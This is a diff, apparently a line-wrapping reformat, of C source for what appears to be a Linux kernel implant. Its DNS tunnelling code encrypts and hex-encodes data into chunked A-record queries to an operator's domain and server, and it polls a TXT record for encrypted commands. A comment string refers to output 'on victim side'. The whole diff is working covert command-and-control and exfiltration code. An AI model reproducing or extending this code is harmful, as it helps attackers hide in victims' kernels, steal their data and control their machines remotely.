@@ -26,12 +26,14 @@ struct dns_header_t {
  * sends over UDP to the configured @c DNS_SERVER_IP, and blocks for the reply.
  *
  * @param query_name Full qname (labels + domain) to query.
- * @param question_type QTYPE in network byte order (e.g. htons(1) for A, htons(16) for TXT).
+ * @param question_type QTYPE in network byte order (e.g. htons(1) for A,
+ * htons(16) for TXT).
  * @param response_buffer Buffer to store the received packet data.
  * @param response_length Size of response_buffer
  * @return 0 on success, negative errno on failure.
  */
-static int dns_send_query(const char *query_name, __be16 question_type, u8 *response_buffer, int *response_length) {
+static int dns_send_query(const char *query_name, __be16 question_type,
+                          u8 *response_buffer, int *response_length) {
     struct socket *sock;
     struct sockaddr_in dest_addr;
     struct msghdr msg = {};
@@ -97,7 +99,8 @@ static int dns_send_query(const char *query_name, __be16 question_type, u8 *resp
     msg.msg_namelen = sizeof(dest_addr);
 
     // DEBUG Log (ugly)
-    // DBG_MSG("dns_send_query: sending %d-byte DNS query for '%s'\n", offset, query_name);
+    // DBG_MSG("dns_send_query: sending %d-byte DNS query for '%s'\n", offset,
+    // query_name);
 
     // Send the DNS query
     iov.iov_base = packet_buffer;
@@ -153,7 +156,8 @@ int dns_send_data(const char *data, size_t data_len) {
 
     size_t total_chunks = (encrypted_len + DNS_MAX_CHUNK - 1) / DNS_MAX_CHUNK;
 
-    // Too many chunks, refuse to send, arbitrarily limit to DNS_MAX_AUTHORIZED_NB_CHUNKS
+    // Too many chunks, refuse to send, arbitrarily limit to
+    // DNS_MAX_AUTHORIZED_NB_CHUNKS
     if (total_chunks > DNS_MAX_AUTHORIZED_NB_CHUNKS) {
         vfree(encrypted_msg);
         dns_send_data("Output on victim side too big. Use TCP instead. ", 47);
@@ -173,7 +177,8 @@ int dns_send_data(const char *data, size_t data_len) {
 
     // Loop over each data chunk
     for (chunk_index = 0; chunk_index < total_chunks; chunk_index++) {
-        size_t chunk_size = min(encrypted_len - chunk_index * DNS_MAX_CHUNK, (size_t)DNS_MAX_CHUNK);
+        size_t chunk_size =
+            min(encrypted_len - chunk_index * DNS_MAX_CHUNK, (size_t)DNS_MAX_CHUNK);
         char hex_buffer[2 * DNS_MAX_CHUNK + 1];
         char seq_label[80];
         char full_qname[200];
@@ -181,17 +186,21 @@ int dns_send_data(const char *data, size_t data_len) {
 
         // Hex-encode the chunk
         for (i = 0; i < chunk_size; i++)
-            sprintf(hex_buffer + 2 * i, "%02x", encrypted_msg[chunk_index * DNS_MAX_CHUNK + i]);
+            sprintf(hex_buffer + 2 * i, "%02x",
+                    encrypted_msg[chunk_index * DNS_MAX_CHUNK + i]);
         hex_buffer[2 * chunk_size] = '\0';
 
-        // Prefix with sequence/total header (not the best way to do it I think, but works)
-        snprintf(seq_label, sizeof(seq_label), "%02zx/%02zx-%s", chunk_index, total_chunks, hex_buffer);
+        // Prefix with sequence/total header (not the best way to do it I think, but
+        // works)
+        snprintf(seq_label, sizeof(seq_label), "%02zx/%02zx-%s", chunk_index,
+                 total_chunks, hex_buffer);
 
         // Build full QNAME: "seq_label.DNS_DOMAIN"
         snprintf(full_qname, sizeof(full_qname), "%s.%s", seq_label, DNS_DOMAIN);
 
         // Send the A-query carrying this chunk over DNS
-        dns_send_query(full_qname, htons(1), response_buffer_local, &response_length_local);
+        dns_send_query(full_qname, htons(1), response_buffer_local,
+                       &response_length_local);
 
         // Craque le sleep
         msleep(10);
@@ -229,7 +238,8 @@ int dns_receive_command(char *out_buffer, size_t max_length) {
     snprintf(poll_qname, 128, "command.%s", DNS_DOMAIN);
 
     // Send TXT query and get raw response
-    result = dns_send_query(poll_qname, htons(16), response_buffer_local, &response_length_local);
+    result = dns_send_query(poll_qname, htons(16), response_buffer_local,
+                            &response_length_local);
     kfree(poll_qname);
     if (result < 0) {
         kfree(response_buffer_local);
@@ -278,7 +288,9 @@ int dns_receive_command(char *out_buffer, size_t max_length) {
         char *decrypted = NULL;
         size_t decrypted_len = 0;
 
-        if (decrypt_buffer(response_buffer_local + offset, txt_length, &decrypted, &decrypted_len) < 0) {
+        if (decrypt_buffer(response_buffer_local + offset, txt_length, &decrypted,
+                           &decrypted_len)
+            < 0) {
             kfree(response_buffer_local);
             return -EIO;
         }
